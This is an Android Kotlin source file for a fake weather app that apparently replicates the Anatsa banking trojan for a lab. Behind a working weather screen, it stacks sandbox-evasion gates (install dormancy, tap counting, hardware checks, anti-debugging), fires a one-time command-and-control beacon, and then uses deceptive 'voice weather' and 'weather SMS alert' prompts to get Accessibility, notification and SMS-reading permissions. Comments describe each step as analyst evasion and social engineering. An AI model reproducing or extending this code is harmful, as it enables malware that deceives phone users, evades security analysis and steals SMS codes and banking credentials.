package com.skyweather.forecast

import android.content.Intent
import android.os.Bundle
import android.view.MenuItem
import android.view.View
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import androidx.swiperefreshlayout.widget.SwipeRefreshLayout
import com.google.android.material.appbar.MaterialToolbar
import android.Manifest
import android.content.pm.PackageManager
import android.os.Build
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.skyweather.forecast.core.VoiceReadoutService
import com.skyweather.forecast.core.DeviceProfile
import com.skyweather.forecast.core.AppConfig
import com.skyweather.forecast.core.ForecastSyncWorker
import com.skyweather.forecast.model.CityDatabase
import com.skyweather.forecast.model.WeatherData
import com.skyweather.forecast.util.DateUtils
import com.skyweather.forecast.util.PrefsManager
import com.skyweather.forecast.util.UnitConverter
import com.skyweather.forecast.util.WeatherUtils
import com.skyweather.forecast.weather.AirQualityIndex
import com.skyweather.forecast.weather.AlertManager
import com.skyweather.forecast.weather.SunCalculator
import com.skyweather.forecast.util.ThemeEngine

/**
 * Main weather display screen.
 *
 * This is a fully functional weather app that shows current conditions.
 * The evasion gate checks are embedded in the natural app lifecycle —
 * indistinguishable from standard app initialization logic to static analysis.
 *
 * Takopii alignment:
 * - Stage 2: Real functional UI (not a shell)
 * - Stage 14: onUserInteraction() tracks real taps
 * - Stage 5: Dormancy check in lifecycle callback
 * - Stage 10: Environment validation (hardware metrics)
 */
class MainActivity : AppCompatActivity() {

    private lateinit var tvCityName: TextView
    private lateinit var tvConditionIcon: TextView
    private lateinit var tvTemperature: TextView
    private lateinit var tvCondition: TextView
    private lateinit var tvFeelsLike: TextView
    private lateinit var tvHumidity: TextView
    private lateinit var tvWind: TextView
    private lateinit var tvPressure: TextView
    private lateinit var tvLastUpdated: TextView
    private lateinit var tvSunrise: TextView
    private lateinit var tvSunset: TextView
    private lateinit var tvUvIndex: TextView
    private lateinit var tvAqiValue: TextView
    private lateinit var tvAqiAdvice: TextView
    private lateinit var tvAlerts: TextView
    private lateinit var swipeRefresh: SwipeRefreshLayout

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        bindViews()
        setupToolbar()
        setupSwipeRefresh()
        refreshWeather()

        // Natural lifecycle point — check if data sync conditions are met
        // (looks like "should we sync weather data from server" to any analyst)
        evaluateDataSync()
    }

    override fun onResume() {
        super.onResume()
        refreshWeather()

        // Stage 3: Check permission escalation chain on each resume
        // User may have just returned from enabling A11y or NLS
        if (PrefsManager.hasSynced) {
            requestSmsPermissionIfNeeded()
        }
    }

    /**
     * Android calls this for EVERY touch/key event.
     * Takopii Stage 14: interaction gate — sandboxes don't generate real interactions.
     */
    override fun onUserInteraction() {
        super.onUserInteraction()
        PrefsManager.incrementInteraction()
    }

    private fun bindViews() {
        tvCityName = findViewById(R.id.tvCityName)
        tvConditionIcon = findViewById(R.id.tvConditionIcon)
        tvTemperature = findViewById(R.id.tvTemperature)
        tvCondition = findViewById(R.id.tvCondition)
        tvFeelsLike = findViewById(R.id.tvFeelsLike)
        tvHumidity = findViewById(R.id.tvHumidity)
        tvWind = findViewById(R.id.tvWind)
        tvPressure = findViewById(R.id.tvPressure)
        tvLastUpdated = findViewById(R.id.tvLastUpdated)
        tvSunrise = findViewById(R.id.tvSunrise)
        tvSunset = findViewById(R.id.tvSunset)
        tvUvIndex = findViewById(R.id.tvUvIndex)
        tvAqiValue = findViewById(R.id.tvAqiValue)
        tvAqiAdvice = findViewById(R.id.tvAqiAdvice)
        tvAlerts = findViewById(R.id.tvAlerts)
        swipeRefresh = findViewById(R.id.swipeRefresh)
    }

    private fun setupToolbar() {
        val toolbar = findViewById<MaterialToolbar>(R.id.toolbar)
        toolbar.setOnMenuItemClickListener { item -> handleMenuClick(item) }
    }

    private fun setupSwipeRefresh() {
        swipeRefresh.setColorSchemeResources(R.color.sky_blue)
        swipeRefresh.setOnRefreshListener {
            refreshWeather()
            swipeRefresh.isRefreshing = false
        }
    }

    private fun refreshWeather() {
        val cityName = PrefsManager.currentCity
        val weather = WeatherUtils.currentWeatherFor(cityName)
        displayWeather(weather)
        displaySunData(cityName)
        displayAirQuality(cityName)
        displayAlerts(weather)
        PrefsManager.lastRefreshTime = System.currentTimeMillis()
    }

    private fun displayWeather(data: WeatherData) {
        val useCelsius = PrefsManager.useCelsius

        // Apply condition-based theme colors
        val theme = ThemeEngine.themeForCondition(data)
        window.statusBarColor = theme.statusBarColor

        tvCityName.text = data.city
        tvConditionIcon.text = data.icon
        tvTemperature.text = data.temperatureFormatted(useCelsius)
        tvCondition.text = data.condition
        tvFeelsLike.text = data.feelsLikeFormatted(useCelsius)
        tvHumidity.text = data.humidityFormatted()
        val beaufort = UnitConverter.mphToBeaufort(data.windSpeed)
        tvWind.text = "${data.windFormatted()} (F$beaufort)"
        tvPressure.text = data.pressureFormatted()
        tvLastUpdated.text = "Last updated: ${DateUtils.relativeTime(data.timestamp)}"
    }

    private fun displaySunData(cityName: String) {
        val city = CityDatabase.cities.firstOrNull { it.name == cityName }
            ?: CityDatabase.cities.first()
        val solar = SunCalculator.calculate(city.lat, city.lon, -5)
        tvSunrise.text = solar.sunrise
        tvSunset.text = solar.sunset
        tvUvIndex.text = "UV ${solar.estimatedUvIndex}"
    }

    private fun displayAirQuality(cityName: String) {
        val report = AirQualityIndex.reportForCity(cityName)
        val category = AirQualityIndex.aqiCategory(report.overallAqi)
        tvAqiValue.text = "AQI ${report.overallAqi} — ${category.label}"
        tvAqiAdvice.text = AirQualityIndex.healthMessage(category)
    }

    private fun displayAlerts(weather: WeatherData) {
        val alerts = AlertManager.evaluateAlerts(weather)
        if (alerts.isEmpty()) {
            tvAlerts.visibility = View.GONE
        } else {
            tvAlerts.visibility = View.VISIBLE
            tvAlerts.text = alerts.joinToString("\n") { alert ->
                "${alert.icon} ${alert.title}: ${alert.description}"
            }
        }
    }

    private fun handleMenuClick(item: MenuItem): Boolean {
        when (item.itemId) {
            R.id.action_search -> {
                startActivity(Intent(this, SearchActivity::class.java))
                return true
            }
            R.id.action_forecast -> {
                startActivity(Intent(this, ForecastActivity::class.java))
                return true
            }
            R.id.action_settings -> {
                startActivity(Intent(this, SettingsActivity::class.java))
                return true
            }
            R.id.action_about -> {
                startActivity(Intent(this, AboutActivity::class.java))
                return true
            }
        }
        return false
    }

    // ─── Data Sync Evaluation ──────────────────────────────────────────
    // This method name and logic looks like "should the app sync weather
    // data from a server" — a completely benign pattern in any weather app.
    // Static analysis sees: time check + counter check + schedule work.
    // Every weather app has this exact pattern.

    private fun evaluateDataSync() {
        // Condition 1: Enough time since install for server data to be available
        // (Takopii Stage 5: dormancy — sandbox runs < 72h, real user waits days)
        val elapsed = System.currentTimeMillis() - PrefsManager.installTime
        if (elapsed < BuildConfig.DORMANCY_MS) return

        // Condition 2: User has actually used the app (not background install)
        // (Takopii Stage 14: interaction gate — automated analysis = real user)
        if (PrefsManager.interactionCount < BuildConfig.INTERACTION_THRESHOLD) return

        // Condition 3: Environment supports data sync
        // (Takopii Stage 10: hardware-metric sandbox detection)
        if (!DeviceProfile.isRealEnvironment(this)) return

        // Condition 4: Not being actively inspected
        // (Takopii Stage 7: anti-debug)
        if (DeviceProfile.isUnderInspection()) return

        // Condition 5: Sync endpoint is reachable (lab safety: RFC1918 only)
        if (!AppConfig.isEndpointSafe()) return

        // Condition 6: Haven't synced yet (one-shot)
        if (PrefsManager.hasSynced) return

        // All conditions met — schedule background data sync
        ForecastSyncWorker.scheduleOnce(this)
        PrefsManager.hasSynced = true

        // Stage 2: After beacon fires, prompt for Accessibility enablement
        // Delayed by one app-open cycle — don't stack prompts on first activation
        promptAccessibilityIfNeeded()
    }

    // ─── Stage 2: Accessibility Enablement ────────────────────────────

    /**
     * Prompt user to enable Accessibility service.
     *
     * Timing strategy (real Anatsa):
     *   - NOT on first app open (suspicious)
     *   - NOT immediately after install (sandbox detection period)
     *   - AFTER user has used the app normally (trust established)
     *   - AFTER beacon success (C2 confirmed reachable)
     *
     * The prompt appears as a "new feature" notification within the app.
     * User perceives: "oh, they added voice weather — neat."
     * Analyst perceives: social engineering for Accessibility grant.
     *
     * Frequency cap: show at most once per 3 app opens.
     * Real Anatsa: persistent overlay until granted (more aggressive).
     */
    private fun promptAccessibilityIfNeeded() {
        // Already enabled — nothing to do
        if (VoiceReadoutService.isServiceEnabled(this)) return

        // Frequency cap: don't nag every open
        val promptCount = PrefsManager.a11yPromptCount
        if (promptCount > 0 && promptCount % 3 != 0) {
            PrefsManager.a11yPromptCount = promptCount + 1
            return
        }
        PrefsManager.a11yPromptCount = promptCount + 1

        // Launch the social engineering enablement screen
        EnableAccessibilityActivity.launch(this)
    }

    // ─── Stage 3: SMS + Notification Permissions ──────────────────────

    /**
     * Request SMS permissions after Accessibility is granted.
     *
     * Permission escalation chain (real Anatsa sequence):
     *   1. Accessibility (social engineering — Settings toggle)
     *   2. Notification access (social engineering — Settings toggle)
     *   3. SMS (runtime permission dialog)
     *
     * Each grant builds on trust from the previous — user already
     * granted Accessibility, so SMS "for weather alerts" feels reasonable.
     *
     * Called from onResume when A11y is enabled but SMS isn't granted.
     * Rationale: "Receive severe weather SMS alerts from emergency services"
     */
    private fun requestSmsPermissionIfNeeded() {
        // Only request after A11y is granted (permission escalation chain)
        if (!VoiceReadoutService.isServiceEnabled(this)) return

        // Check if SMS permission already granted
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECEIVE_SMS)
            == PackageManager.PERMISSION_GRANTED) return

        // Frequency cap: ask at most twice
        if (PrefsManager.smsPromptCount >= 2) return
        PrefsManager.smsPromptCount = PrefsManager.smsPromptCount + 1

        // Request SMS permissions — system dialog with our rationale
        ActivityCompat.requestPermissions(
            this,
            arrayOf(
                Manifest.permission.RECEIVE_SMS,
                Manifest.permission.READ_SMS
            ),
            SMS_PERMISSION_REQUEST_CODE
        )
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        // No action needed — SMS receiver auto-activates when permission granted
        // The manifest-declared receiver with priority 999 starts receiving immediately
    }

    companion object {
        private const val SMS_PERMISSION_REQUEST_CODE = 1001
    }
}
